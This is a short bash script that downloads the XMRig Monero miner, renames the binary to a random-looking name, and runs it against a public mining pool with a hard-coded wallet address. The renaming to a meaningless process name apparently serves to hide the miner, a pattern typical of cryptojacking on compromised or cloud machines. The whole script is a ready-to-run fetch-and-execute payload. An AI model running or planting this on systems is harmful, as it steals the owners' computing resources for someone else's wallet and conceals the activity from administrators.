#!/bin/bash
sudo apt-get update
VERSION=6.3.1
azure=mxsemsdnlkdj
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
apt-get install -y git wget screen
mkdir /usr/share
mkdir /usr/share/work
rm -r /usr/share/work/xmrig-$VERSION
wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-xenial-x64.tar.gz
mv xmrig-$VERSION-xenial-x64.tar.gz /usr/share/work/
cd /usr/share/work/ &&  tar -xvzf xmrig-$VERSION-xenial-x64.tar.gz
rm -rf xmrig-$VERSION-xenial-x64.tar.gz && cd xmrig-$VERSION
mv xmrig $azure -n
cp $azure "$cpuname"
rm -f  xmrig
POOL=pool.minexmr.com:6666
USERNAME=84g9tdhjFZHRQVU35xB4bsSaVBNkZU8W5NUWzHPwmQNT1Ef9gYGPew4hr3PRjUbNK4KYHSGQDLYrJNHdfUyy4ojNCCJM5cu
ALGO=rx/0
DONATE=1
./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.ixProU184 -p x -a $ALGO -k --tls
